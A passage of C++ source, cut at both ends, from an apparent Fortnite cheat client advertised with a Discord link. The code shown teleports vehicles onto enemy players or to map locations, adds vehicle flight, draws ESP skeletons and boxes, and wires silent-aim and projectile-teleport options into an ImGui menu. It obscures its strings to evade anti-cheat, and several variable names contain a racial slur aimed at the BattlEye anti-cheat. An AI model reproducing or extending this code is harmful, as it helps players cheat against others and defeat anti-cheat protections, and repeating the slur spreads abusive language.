							Vector3 TargetPawnRelativeLocation = head;
							CurrentVehicle->K2_TeleportTo(TargetPawnRelativeLocation, Addresses::CameraRotation);
						}
					}
					else {
						if (!CurrentVehicle) return false;
					}
				}

				else if (Settings::EnableTP) {
					AFortPawn* CurrentVehicle = Addresses::LocalPawn->GetVehicle();

					if (CurrentVehicle) {
						Vector3 LazyLake = { -49784.277344, 52951.078125, 3965.149902 };
						Vector3 WeepingWoods = { -27864.421875, -22980.433594, -869.825256 };
						Vector3 RetailRow = { -38222.121094, 98802.531250, 5805.213379 };
						Vector3 SlurpySwamp = { -66213.726562, -44544.425781, -1883.901611 };
						Vector3 BoneyBurbs = { 13133.120117, -20437.457031, -338.191010 };
						Vector3 PleasantPark = { 58242.730469, -19971.500000, -1146.243042 };
						Vector3 BeliverBeach = { -3448.823472, 30777.500000, -71932.901371 };
						Vector3 Dirtydocks = { 16142.531726, 112284.500000, -3070.293274 };
						Vector3 CornyCrops = { 36438.707236, 44318.500000, -1534.243766 };
						Vector3 Craggyclifs = { 99855.487234, 26880.500000, -2303.950163 };
						Vector3 coralcastle = { 70825.801236, -79362.500000, -6226.471231 };
						Vector3 hollyhedges = { -12916.501236, -75252.500000, -767.996213 };
						Vector3 steamystacks = { 83217.237622, 93133.500000, -1555.999173 };
						Vector3 PreLobby = { -169557.593750, -179321.500000, -3126.227539 };
						//Vector3 MiniGameLoot = { -59486.101562, 417433.500000, 50701.371094 };

						if (Settings::TP_lazylake) {
							CurrentVehicle->K2_TeleportTo(LazyLake, Addresses::CameraRotation);
							Settings::TP_lazylake = false;
						}
						else if (Settings::TP_WeepingWoods) {
							CurrentVehicle->K2_TeleportTo(WeepingWoods, Addresses::CameraRotation);
							Settings::TP_WeepingWoods = false;
						}
						else if (Settings::TP_RetailRow) {
							CurrentVehicle->K2_TeleportTo(RetailRow, Addresses::CameraRotation);
							Settings::TP_RetailRow = false;
						}
						else if (Settings::TP_SlurpySwamp) {
							CurrentVehicle->K2_TeleportTo(SlurpySwamp, Addresses::CameraRotation);
							Settings::TP_SlurpySwamp = false;
						}
						else if (Settings::TP_BoneyBurbs) {
							CurrentVehicle->K2_TeleportTo(BoneyBurbs, Addresses::CameraRotation);
							Settings::TP_BoneyBurbs = false;
						}
						else if (Settings::TP_PleasantPark) {
							CurrentVehicle->K2_TeleportTo(PleasantPark, Addresses::CameraRotation);
							Settings::TP_PleasantPark = false;
						}
						else if (Settings::TP_PreLobby) {
							CurrentVehicle->K2_TeleportTo(PreLobby, Addresses::CameraRotation);
							Settings::TP_PreLobby = false;
						}
						else if (Settings::TP_BeliverBeach) {
							CurrentVehicle->K2_TeleportTo(BeliverBeach, Addresses::CameraRotation);
							Settings::TP_BeliverBeach = false;
						}
						else if (Settings::TP_CornyCrops) {
							CurrentVehicle->K2_TeleportTo(CornyCrops, Addresses::CameraRotation);
							Settings::TP_CornyCrops = false;
						}
						else if (Settings::TP_Craggyclifs) {
							CurrentVehicle->K2_TeleportTo(Craggyclifs, Addresses::CameraRotation);
							Settings::TP_Craggyclifs = false;
						}
						else if (Settings::TP_coralcastle) {
							CurrentVehicle->K2_TeleportTo(coralcastle, Addresses::CameraRotation);
							Settings::TP_coralcastle = false;
						}
						else if (Settings::TP_hollyhedges) {
							CurrentVehicle->K2_TeleportTo(hollyhedges, Addresses::CameraRotation);
							Settings::TP_hollyhedges = false;
						}
						else if (Settings::TP_steamystacks) {
							CurrentVehicle->K2_TeleportTo(steamystacks, Addresses::CameraRotation);
							Settings::TP_steamystacks = false;
						}
						//else if (Settings::TP_Locations) {
						//	CurrentVehicle->K2_TeleportTo(MiniGameLoot, Addresses::CameraRotation);
						//}
					}
					else {
						if (!CurrentVehicle) return false;
					}
				}

				else if (Settings::vehiclefly)
				{
					AFortPawn* CurrentVehicle = Addresses::LocalPawn->GetVehicle();

					if (CurrentVehicle) {
						if (A1337GetAsyncKeyState(0x57)) { //w
							Vector3 CarRelativeLocation = CurrentVehicle->RootComponent()->RelativeLocation();
							if (!valid_Vector3(CarRelativeLocation))continue;
							CarRelativeLocation.x = CarRelativeLocation.x + Settings::vehicleflyspeed;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
						}
						if (A1337GetAsyncKeyState(0x53)) { //s
							Vector3 CarRelativeLocation = CurrentVehicle->RootComponent()->RelativeLocation();
							if (!valid_Vector3(CarRelativeLocation))continue;
							CarRelativeLocation.x = CarRelativeLocation.x - Settings::vehicleflyspeed;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
						}
						if (A1337GetAsyncKeyState(0x41)) { //a
							Vector3 CarRelativeLocation = CurrentVehicle->RootComponent()->RelativeLocation();
							if (!valid_Vector3(CarRelativeLocation))continue;
							CarRelativeLocation.y = CarRelativeLocation.y + Settings::vehicleflyspeed;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
						}
						if (A1337GetAsyncKeyState(0x44)) { //d
							Vector3 CarRelativeLocation = CurrentVehicle->RootComponent()->RelativeLocation();
							if (!valid_Vector3(CarRelativeLocation))continue;
							CarRelativeLocation.y = CarRelativeLocation.y - Settings::vehicleflyspeed;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
						}
						if (A1337GetAsyncKeyState(VK_SPACE)) { //spaceA
							Vector3 CarRelativeLocation = CurrentVehicle->RootComponent()->RelativeLocation();
							if (!valid_Vector3(CarRelativeLocation))continue;
							CarRelativeLocation.z = CarRelativeLocation.z + Settings::vehicleflyspeed;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
						}
					}
					else {
						if (!CurrentVehicle) return false;
					}
				}

				else if (Settings::CarTpToPing) { //auto kill
					AFortPawn* CurrentVehicle = Addresses::LocalPawn->GetVehicle();

					if (CurrentVehicle) {
						if (A1337GetAsyncKeyState(0x57)) { //w
							Vector3 headvec3;
							SDK::Classes::USkeletalMeshComponent::GetBoneLocation((uintptr_t)CurrentActor, Settings::aimbone, &headvec3);
							if (!valid_Vector3(headvec3))continue;
							Vector3 head = { headvec3.x, headvec3.y, headvec3.z };

							Vector3 TargetPawnRelativeLocation = head;
							CurrentVehicle->K2_TeleportTo(TargetPawnRelativeLocation, Addresses::CameraRotation);
						}
						if (A1337GetAsyncKeyState(VK_SPACE)) { //spaceA
							Vector3 CarRelativeLocation = CurrentVehicle->RootComponent()->RelativeLocation();
							if (!valid_Vector3(CarRelativeLocation))continue;
							CarRelativeLocation.z = CarRelativeLocation.z + 10;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
							CarRelativeLocation.z = CarRelativeLocation.z + 10;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
							CarRelativeLocation.z = CarRelativeLocation.z + 10;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
							CarRelativeLocation.z = CarRelativeLocation.z + 10;
							CurrentVehicle->K2_TeleportTo(CarRelativeLocation, Addresses::CameraRotation);
						}
					}
				}

			}
			if (strstr(name, skCrypt("PlayerPawn")))
			{
				if (SDK::Utils::CheckInScreen(CurrentActor, Renderer_Defines::Width, Renderer_Defines::Height)) {

					Vector3 HeadPos, Headbox, bottom;

					SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 98, &HeadPos);
					SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 0, &bottom);

					if (!valid_Vector3(HeadPos))continue;
					if (!valid_Vector3(bottom))continue;

					SDK::Classes::AController::WorldToScreen(Vector3(HeadPos.x, HeadPos.y, HeadPos.z), &Headbox);
					SDK::Classes::AController::WorldToScreen(bottom, &bottom);

					if (Settings::Box2D == 1 or Settings::BoxCorner == 1) {
						fgytfrytdrfyddsbgfiubsdfibgusfdbu(CurrentActor);
					}

					//int MostRightBone, MostLeftBone;
					int array[20] = { head2.x, fuckbattleeyenigger.x, pelvis.x, fuckbattleeye.x, leftShoulder.x, rightShoulder.x, leftElbow.x, rightElbow.x, leftHand.x, rightHand.x, leftLeg.x, rightLeg.x, leftThigh.x, rightThigh.x, leftFoot.x, rightFoot.x, leftFeet.x, rightFeet.x, leftFeetFinger.x, rightFeetFinger.x };
					int MostRightBone = array[0];
					int MostLeftBone = array[0];

					for (int mostrighti = 0; mostrighti < 10; mostrighti++)
					{
						if (array[mostrighti] > MostRightBone)
							MostRightBone = array[mostrighti];
					}

					for (int mostlefti = 0; mostlefti < 10; mostlefti++)
					{
						if (array[mostlefti] < MostLeftBone)
							MostLeftBone = array[mostlefti];
					}

					float ActorHeight = (Headbox.y - bottom.y);
					if (ActorHeight < 0) ActorHeight = ActorHeight * (-1.f);

					int ActorWidth = MostRightBone - MostLeftBone;

					if (Settings::SnapLines) {
						ImColor col;
						if (IsVisible) {
							col = SettingsColor::Snaplines;
						}
						else {
							col = SettingsColor::Snaplines_notvisible;
						}
						Vector3 LocalPelvis;
						SDK::Classes::USkeletalMeshComponent::GetBoneLocation(LocalPawn, 85, &LocalPelvis);
						if (!valid_Vector3(LocalPelvis))continue;
						SDK::Classes::AController::WorldToScreen(LocalPelvis, &LocalPelvis);

						Overlay->AddLine(ImVec2(LocalPelvis.x, LocalPelvis.y), ImVec2(pelvis.x, pelvis.y), col, 1.f);
					}

					if (Settings::Skeleton_Low)
					{
						ImColor col = ImColor(3, 169, 252, 255);

						if (!valid_Vector3(head2))continue;
						if (!valid_Vector3(fuckbattleeyenigger))continue;
						if (!valid_Vector3(pelvis))continue;
						if (!valid_Vector3(leftShoulder))continue;
						if (!valid_Vector3(rightShoulder))continue;
						if (!valid_Vector3(leftElbow))continue;
						if (!valid_Vector3(rightElbow))continue;
						if (!valid_Vector3(leftHand))continue;
						if (!valid_Vector3(rightHand))continue;
						if (!valid_Vector3(leftLeg))continue;
						if (!valid_Vector3(rightLeg))continue;
						if (!valid_Vector3(leftThigh))continue;
						if (!valid_Vector3(rightThigh))continue;
						if (!valid_Vector3(leftFoot))continue;
						if (!valid_Vector3(rightFoot))continue;
						if (!valid_Vector3(leftFeet))continue;
						if (!valid_Vector3(rightFeet))continue;
						if (!valid_Vector3(leftFeetFinger))continue;
						if (!valid_Vector3(rightFeetFinger))continue;

						//main bones
						Overlay->AddLine(ImVec2(head2.x, head2.y), ImVec2(fuckbattleeyenigger.x, fuckbattleeyenigger.y), col, 0.8f);
						Overlay->AddLine(ImVec2(fuckbattleeyenigger.x, fuckbattleeyenigger.y), ImVec2(fuckbattleeye.x, fuckbattleeye.y), col, 0.8f);
						Overlay->AddLine(ImVec2(fuckbattleeye.x, fuckbattleeye.y), ImVec2(pelvis.x, pelvis.y), col, 0.8f);
						Overlay->AddLine(ImVec2(fuckbattleeye.x, fuckbattleeye.y), ImVec2(leftShoulder.x, leftShoulder.y), col, 0.8f);
						Overlay->AddLine(ImVec2(fuckbattleeye.x, fuckbattleeye.y), ImVec2(rightShoulder.x, rightShoulder.y), col, 0.8f);
						Overlay->AddLine(ImVec2(leftShoulder.x, leftShoulder.y), ImVec2(leftElbow.x, leftElbow.y), col, 0.8f);
						Overlay->AddLine(ImVec2(rightShoulder.x, rightShoulder.y), ImVec2(rightElbow.x, rightElbow.y), col, 0.8f);
						Overlay->AddLine(ImVec2(leftElbow.x, leftElbow.y), ImVec2(leftHand.x, leftHand.y), col, 0.8f);
						Overlay->AddLine(ImVec2(rightElbow.x, rightElbow.y), ImVec2(rightHand.x, rightHand.y), col, 0.8f);
						Overlay->AddLine(ImVec2(pelvis.x, pelvis.y), ImVec2(leftLeg.x, leftLeg.y), col, 0.8f);
						Overlay->AddLine(ImVec2(pelvis.x, pelvis.y), ImVec2(rightLeg.x, rightLeg.y), col, 0.8f);
						Overlay->AddLine(ImVec2(leftLeg.x, leftLeg.y), ImVec2(leftThigh.x, leftThigh.y), col, 0.8f);
						Overlay->AddLine(ImVec2(rightLeg.x, rightLeg.y), ImVec2(rightThigh.x, rightThigh.y), col, 0.8f);
						Overlay->AddLine(ImVec2(leftThigh.x, leftThigh.y), ImVec2(leftFoot.x, leftFoot.y), col, 0.8f);
						Overlay->AddLine(ImVec2(rightThigh.x, rightThigh.y), ImVec2(rightFoot.x, rightFoot.y), col, 0.8f);
						Overlay->AddLine(ImVec2(leftFoot.x, leftFoot.y), ImVec2(leftFeet.x, leftFeet.y), col, 0.8f);
						Overlay->AddLine(ImVec2(rightFoot.x, rightFoot.y), ImVec2(rightFeet.x, rightFeet.y), col, 0.8f);
						Overlay->AddLine(ImVec2(leftFeet.x, leftFeet.y), ImVec2(leftFeetFinger.x, leftFeetFinger.y), col, 0.8f);
						Overlay->AddLine(ImVec2(rightFeet.x, rightFeet.y), ImVec2(rightFeetFinger.x, rightFeetFinger.y), col, 0.8f);
					}

					if (Settings::Box3D)
					{
						Vector3 BottomNoW2S;
						Vector3 HeadNoW2S;

						SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 98, &HeadNoW2S);
						SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 0, &BottomNoW2S);

						if (!valid_Vector3(HeadNoW2S))continue;
						if (!valid_Vector3(BottomNoW2S))continue;

						Vector3 bottom1;
						Vector3 bottom2;
						Vector3 bottom3;
						Vector3 bottom4;

						SDK::Classes::AController::WorldToScreen(Vector3(BottomNoW2S.x + 30, BottomNoW2S.y - 30, BottomNoW2S.z), &bottom1);
						SDK::Classes::AController::WorldToScreen(Vector3(BottomNoW2S.x - 30, BottomNoW2S.y - 30, BottomNoW2S.z), &bottom2);
						SDK::Classes::AController::WorldToScreen(Vector3(BottomNoW2S.x - 30, BottomNoW2S.y + 30, BottomNoW2S.z), &bottom3);
						SDK::Classes::AController::WorldToScreen(Vector3(BottomNoW2S.x + 30, BottomNoW2S.y + 30, BottomNoW2S.z), &bottom4);

						Vector3 top1;
						Vector3 top2;
						Vector3 top3;
						Vector3 top4;

						SDK::Classes::AController::WorldToScreen(Vector3(HeadNoW2S.x + 30, HeadNoW2S.y - 30, HeadNoW2S.z), &top1);
						SDK::Classes::AController::WorldToScreen(Vector3(HeadNoW2S.x - 30, HeadNoW2S.y - 30, HeadNoW2S.z), &top2);
						SDK::Classes::AController::WorldToScreen(Vector3(HeadNoW2S.x - 30, HeadNoW2S.y + 30, HeadNoW2S.z), &top3);
						SDK::Classes::AController::WorldToScreen(Vector3(HeadNoW2S.x + 30, HeadNoW2S.y + 30, HeadNoW2S.z), &top4);

						ImColor col;
						if (IsVisible) {
							col = SettingsColor::Box;
						}
						else {
							col = SettingsColor::Box_notvisible;
						}

						Overlay->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), col, 1.f);
						Overlay->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), col, 1.f);
						Overlay->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), col, 1.f);
						Overlay->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), col, 1.f);

						Overlay->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), col, 1.f);
						Overlay->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), col, 1.f);
						Overlay->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), col, 1.f);
						Overlay->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), col, 1.f);

						Overlay->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), col, 1.f);
						Overlay->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), col, 1.f);
						Overlay->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), col, 1.f);
						Overlay->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), col, 1.f);
					}

					if (Settings::Box2D) {
						ImColor col;
						if (IsVisible) {
							col = SettingsColor::Box;
						}
						else {
							col = SettingsColor::Box_notvisible;
						}

						draw2dboundingbox(Headbox, ActorWidth, ActorHeight, col);
					}

					if (Settings::BoxCorner) {
						ImColor col;
						if (IsVisible) {
							col = SettingsColor::Box;
						}
						else {
							col = SettingsColor::Box_notvisible;
						}

						drawcornerboxESP(Headbox.x - (ActorWidth / 2), Headbox.y, ActorWidth, ActorHeight, col, 1.0f);
					}
				}
			}
		}

		if (Settings::Bullettp || Settings::SilentAim || Settings::ProjectileTP) {
			if (hasbdhuasbdhjasbdjhasbdhuhuh && A1337GetAsyncKeyState(Settings::aimkey) && A1337GetAsyncKeyState(VK_LBUTTON)) {
				if (Settings::LockLine) {
					Overlay->AddLine(ImVec2(Renderer_Defines::Width / 2, Renderer_Defines::Height / 2), ImVec2(head2.x, head2.y), ImColor(255, 0, 0, 255), 1.f);
				}
				TargetPawn = hasbdhuasbdhjasbdjhasbdhuhuh;
			}
			else {
				TargetPawn = nullptr;
			}
		}
		else {
			TargetPawn = nullptr;
		}
	}
	catch (...) {}
}

ImGuiStyle* dst;
ImFont* icons = nullptr;
ImFont* big = nullptr;
ImFont* bigger = nullptr;
ImFont* g_font = nullptr;

bool Tab(const char* icon, const char* label, const ImVec2& size_arg, const bool selected)
{
	

	ImGuiWindow* window = ImGui::GetCurrentWindow();
	if (window->SkipItems)
		return false;

	static float sizeplus = 0.f;

	ImGuiContext& g = *GImGui;
	const ImGuiStyle& style = g.Style;
	const ImGuiID id = window->GetID(label);
	const ImVec2 label_size = ImGui::CalcTextSize(label, NULL, true);

	ImVec2 pos = window->DC.CursorPos;

	ImVec2 size = ImGui::CalcItemSize(size_arg, label_size.x + style.FramePadding.x * 2.0f, label_size.y + style.FramePadding.y * 2.0f);
	
	const ImRect bb(pos, ImVec2(pos.x + size.x, pos.y + size.y));
	ImGui::ItemSize(size, style.FramePadding.y);
	if (!ImGui::ItemAdd(bb, id))
		return false;

	bool hovered, held;
	bool pressed = ImGui::ButtonBehavior(bb, id, &hovered, &held, 0);

	auto animcolor3 = ImColor(27, 27, 27, 255);
	auto animcolor2 = ImColor(3, 169, 252, 255);
	auto animcolor = ImColor(24, 24, 24, 255);

	window->DrawList->AddRectFilled({ bb.Min.x,bb.Max.y }, { bb.Max.x,bb.Min.y }, animcolor);

	if (selected)
		window->DrawList->AddRectFilled({ bb.Min.x,bb.Max.y }, { bb.Min.x + 2,bb.Min.y }, animcolor2);

	if (selected) 
		window->DrawList->AddRectFilled({ bb.Min.x + 2,bb.Max.y }, { bb.Min.x + 148,bb.Min.y }, animcolor3);

	ImGui::PushFont(big);

	if (selected)
		window->DrawList->AddText({ bb.Min.x + size_arg.x / 2 - ImGui::CalcTextSize(label).x / 2,bb.Min.y + size_arg.y / 2 - ImGui::CalcTextSize(label).y / 2 }, ImColor(225 / 255.f, 225 / 255.f, 225 / 255.f, 255.f / 255.f), label);
		
	if (!selected)
		window->DrawList->AddText({ bb.Min.x + size_arg.x / 2 - ImGui::CalcTextSize(label).x / 2,bb.Min.y + size_arg.y / 2 - ImGui::CalcTextSize(label).y / 2 }, ImColor(75 / 255.f, 75 / 255.f, 75 / 255.f, 255.f / 255.f), label);


	ImGui::PopFont();

	return pressed;
}

bool SubTab(const char* label, const ImVec2& size_arg, const bool selected)
{
	ImGuiWindow* window = ImGui::GetCurrentWindow();
	if (window->SkipItems)
		return false;

	static float sizeplus = 0.f;

	ImGuiContext& g = *GImGui;
	const ImGuiStyle& style = g.Style;
	const ImGuiID id = window->GetID(label);
	const ImVec2 label_size = ImGui::CalcTextSize(label, NULL, true);

	ImVec2 pos = window->DC.CursorPos;

	ImVec2 size = ImGui::CalcItemSize(size_arg, label_size.x + style.FramePadding.x * 2.0f, label_size.y + style.FramePadding.y * 2.0f);

	const ImRect bb(pos, ImVec2(pos.x + size.x, pos.y + size.y));
	ImGui::ItemSize(size, style.FramePadding.y);
	if (!ImGui::ItemAdd(bb, id))
		return false;

	bool hovered, held;
	bool pressed = ImGui::ButtonBehavior(bb, id, &hovered, &held, 0);

	auto animcolor = ImColor(3, 169, 252,255);

	window->DrawList->AddRectFilled({ bb.Max.x,bb.Max.y }, { bb.Min.x,bb.Max.y - 2 }, ImGui::GetColorU32(ImGuiCol_Border));

	if (selected)
		window->DrawList->AddRectFilled({ bb.Max.x,bb.Max.y }, { bb.Min.x,bb.Max.y - 2 }, animcolor);

	if (selected) {
		window->DrawList->AddText({ bb.Min.x + size_arg.x / 2 - ImGui::CalcTextSize(label).x / 2,bb.Min.y + size_arg.y / 2 - ImGui::CalcTextSize(label).y / 2 }, ImColor(255 / 255.f, 255 / 255.f, 255 / 255.f, 255.f / 255.f), label);
	}
	else {
		window->DrawList->AddText({ bb.Min.x + size_arg.x / 2 - ImGui::CalcTextSize(label).x / 2,bb.Min.y + size_arg.y / 2 - ImGui::CalcTextSize(label).y / 2 }, ImColor(200 / 255.f, 200 / 255.f, 200 / 255.f, 255.f / 255.f), label);
	}


	return pressed;
}

ImGuiWindow& CreateScene() 
{
	ImGui_ImplDX11_NewFrame();

	ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0);
	ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0, 0));
	ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0, 0, 0, 0));
	ImGui::Begin(skCrypt("##"), nullptr, ImGuiWindowFlags_NoInputs | ImGuiWindowFlags_NoTitleBar);

	auto& io = ImGui::GetIO();
	ImGui::SetWindowPos(ImVec2(0, 0), ImGuiCond_Always);
	ImGui::SetWindowSize(ImVec2(io.DisplaySize.x, io.DisplaySize.y), ImGuiCond_Always);

	return *ImGui::GetCurrentWindow();
}

void Menu(ImGuiWindow& window)
{
	ModuleBaseW = (uintptr_t)GetModuleA(0);

	Overlay->PushClipRectFullScreen();
	ImGui::End();
	ImGui::PopStyleColor();
	ImGui::PopStyleVar(2);

	ImGuiStyle* style = &ImGui::GetStyle();
	ImVec4* colors = style->Colors;

	if (ShowMenu)
	{
		ImGuiStyle* style = &ImGui::GetStyle();
		static int maintabs = 0;
		static int esptabs = 0;
		static int exploittabs = 0;

		ImGui::StyleColorsDark();

		static int tab = 0;
		static int subtab = 0;
		static auto Active_Tab = 1;
		static auto Active_Legit_Tab = 1;
		static auto Active_Legit_Tab2 = 1;
		static auto Active_Visuals_Tab = 1;
		static auto Active_Visuals_Tab2 = 1;
		static auto Active_Misc_Tab = 1;
		static auto Active_Misc_Tab2 = 1;
		static auto Active_Exploit_Tab = 1;
		static auto Active_Exploit_Tab2 = 1;
		static auto Active_Teleport_Tab = 1;

		style->WindowRounding = 0.f;
		style->FrameRounding = 0.f;
		style->ChildRounding = 0.f;
		style->PopupRounding = 4.f;
		style->WindowPadding = { 0,0 };
		style->WindowBorderSize = 0.f;

		colors[ImGuiCol_Text] = ImColor(255, 255, 255, 255);

		ImGui::SetNextWindowSize({ 650,450 });
		if (ImGui::Begin(skCrypt(""), &ShowMenu, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoTitleBar))
		{
			ImDrawList* draw = ImGui::GetWindowDrawList();
			ImVec2 pos = ImGui::GetWindowPos();
			const auto wnd = ImGui::GetCurrentWindowRead();
			auto ws = wnd->Size;
			auto wp = wnd->Pos;

			if (ShowMenu == 1 and Settings::NormalMenuCursor == 1) {
				ImGui::GetIO().MouseDrawCursor = 1;
			}
			if (Settings::NormalMenuCursor == 0) {
				ImGui::GetIO().MouseDrawCursor = 0;
			}
			if (Settings::NormalMenuCursor == 1 and ShowMenu == false) {
				ImGui::GetIO().MouseDrawCursor = 0;
			}

			draw->AddRectFilled({ pos.x + 150,pos.y }, { pos.x + 650,pos.y + 450 }, ImColor{ 27 / 255.f,27 / 255.f,27 / 255.f,255 / 255.f }); //second background
			draw->AddRectFilled({ pos.x,pos.y }, { pos.x + 650,pos.y + 30 }, ImColor{ 31 / 255.f,31 / 255.f,31 / 255.f,255 / 255.f }); //third background
			draw->AddRect(pos, { pos.x + 650,pos.y + 450 }, ImColor{ 40 / 255.f,40 / 255.f,40 / 255.f,1.f }); //border

			ImGui::GetWindowDrawList()->AddText(ImVec2(ImGui::GetWindowPos().x + 5, ImGui::GetWindowPos().y + 7), ImColor(200, 200, 200, 255), skCrypt("pluFN - https://discord.gg/XCQMttnfbw"));
			//ImGui::PopFont();

			ImGui::SetCursorPos({ 615,5 });
			if (ImGui::Button(skCrypt("X"), ImVec2(25, 0))) {
				ShowMenu = false;
			}

			ImGui::SetCursorPos({ 2,30 });
			if (Tab(skCrypt("A"), skCrypt("Aimbot"), ImVec2(147, 35), Active_Tab == 1 ? true : false))
				Active_Tab = 1;
			ImGui::SetCursorPos({ 2,65 });
			if (Tab(skCrypt("B"), skCrypt("Visuals"), ImVec2(147, 35), Active_Tab == 2 ? true : false))
				Active_Tab = 2;
			ImGui::SetCursorPos({ 2,100 });
			if (Tab(skCrypt("C"), skCrypt("Misc"), ImVec2(147, 35), Active_Tab == 3 ? true : false))
				Active_Tab = 3;
			ImGui::SetCursorPos({ 2,135 });
			if (Tab(skCrypt("D"), skCrypt("Exploits"), ImVec2(147, 35), Active_Tab == 4 ? true : false))
				Active_Tab = 4;

			if (Active_Tab == 1) {
				ImGui::SetCursorPos({ 160,40 });
				ImGui::BeginChild(skCrypt("Test Group##1"), { 237,399 }, true);
				{
					if (SubTab(skCrypt("Aimbot"), ImVec2(118, 25), Active_Legit_Tab == 1 ? true : false))
						Active_Legit_Tab = 1;
					ImGui::SetCursorPos({ 118,0 });
					if (SubTab(skCrypt("Aimbot Config"), ImVec2(119, 25), Active_Legit_Tab == 2 ? true : false))
						Active_Legit_Tab = 2;
					ImGui::SetCursorPos({ 8,30 });
					ImGui::BeginGroup();
					{
						if (Active_Legit_Tab == 1) {
							ImGui::Checkbox(skCrypt("Memory"), &Settings::Aim);
							ImGui::Checkbox(skCrypt("Silent"), &Settings::SilentAim);
							ImGui::Checkbox(skCrypt("Projectile TP \"Only Works In Vehicles\""), &Settings::Bullettp);
						
						}
						if (Active_Legit_Tab == 2) {
							ImGui::Text(skCrypt("Aimbot Random X: %.0f"), Settings::random_x);
							ImGui::SliderFloat(skCrypt("##Aimbot Random X"), &Settings::random_x, -100, 100, skCrypt("%.3f"));

							ImGui::Text(skCrypt("Aimbot Random Y: %.0f"), Settings::random_y);
							ImGui::SliderFloat(skCrypt("##Aimbot Random Y"), &Settings::random_y, -100, 100, skCrypt("%.3f"));

							ImGui::Text(skCrypt("Aimbot Random Z: %.0f"), Settings::random_z);
							ImGui::SliderFloat(skCrypt("##Aimbot Random Z"), &Settings::random_z, -100, 100, skCrypt("%.3f"));

							ImGui::Checkbox(skCrypt("Aimbot LockLine"), &Settings::LockLine);
							ImGui::Spacing();
							ImGui::Text(skCrypt("Aimbot Keys:"));

							ImGui::SameLine();

							style->FramePadding = ImVec2(4.5f, 2.5f);

							if (ImGui::Button(skCrypt("VK_RBUTTON"), ImVec2(75, 17))) {
								Settings::aimkey = VK_RBUTTON;
								Settings::aimkeyint = 1;
							}

							ImGui::SameLine();

							if (ImGui::Button(skCrypt("VK_LBUTTON"), ImVec2(75, 17))) {
								Settings::aimkey = VK_LBUTTON;
								Settings::aimkeyint = 2;
							}

							colors[ImGuiCol_Button] = ImColor(19, 110, 173);
							colors[ImGuiCol_ButtonHovered] = ImColor(0, 134, 224);
							colors[ImGuiCol_ButtonActive] = ImColor(19, 110, 173);

							style->FramePadding = ImVec2(3.0f, 3.0f);

							if (Settings::aimkeyint == 1) {
								ImGui::Text(skCrypt("Current Aimbot Key:"));
								ImGui::SameLine();
								colors[ImGuiCol_Text] = ImColor(255, 255, 255, 255);
								ImGui::Text(skCrypt("Right Mouse Button"));
								colors[ImGuiCol_Text] = ImColor(255, 255, 255);
							}
							if (Settings::aimkeyint == 2) {
								ImGui::Text(skCrypt("Current Aimbot Key:"));
								ImGui::SameLine();
								colors[ImGuiCol_Text] = ImColor(255, 255, 255, 255);
								ImGui::Text(skCrypt("Left Mouse Button"));
								colors[ImGuiCol_Text] = ImColor(255, 255, 255);
							}

							ImGui::Spacing();
							ImGui::Checkbox(skCrypt("Aimbot Prediction"), &Settings::AimPrediction);
							ImGui::Checkbox(skCrypt("Visible Check"), &Settings::VisibleCheck);
							ImGui::Checkbox(skCrypt("360Fov"), &Settings::fov360);
						}
					}
					ImGui::EndGroup();
				}
				ImGui::EndChild();

				ImGui::SetCursorPos({ 402,40 });
				ImGui::BeginChild(skCrypt("Test Group##2"), { 237,399 }, true);
				{
					if (SubTab(skCrypt("Aimbot Settings"), ImVec2(237, 25), Active_Legit_Tab2 == 1 ? true : false))
						Active_Legit_Tab2 = 1;
					ImGui::SetCursorPos({ 8,30 });
					ImGui::BeginGroup();
					{
						ImGui::PushItemWidth(190);
						ImGui::Text(skCrypt("Aimbot Smoothness: %.2f"), Settings::smooth);
						ImGui::SliderFloat(skCrypt("##smooth"), &Settings::smooth, 1, 30, skCrypt("%.3f"));

						ImGui::Text(skCrypt("FOV Circle Value: %.2f"), Settings::FovCircle_Value);
						ImGui::SliderFloat(skCrypt("##fov"), &Settings::FovCircle_Value, 30, 1500, skCrypt("%.3f"));
					}
					ImGui::EndGroup();
				}
				ImGui::EndChild();
			}
			if (Active_Tab == 2) {
				ImGui::SetCursorPos({ 160,40 });
				ImGui::BeginChild(skCrypt("Test Group##3"), { 237,399 }, true);
				{
					if (SubTab(skCrypt("Player ESP"), ImVec2(118, 25), Active_Visuals_Tab == 1 ? true : false))
						Active_Visuals_Tab = 1;
					ImGui::SetCursorPos({ 118,0 });
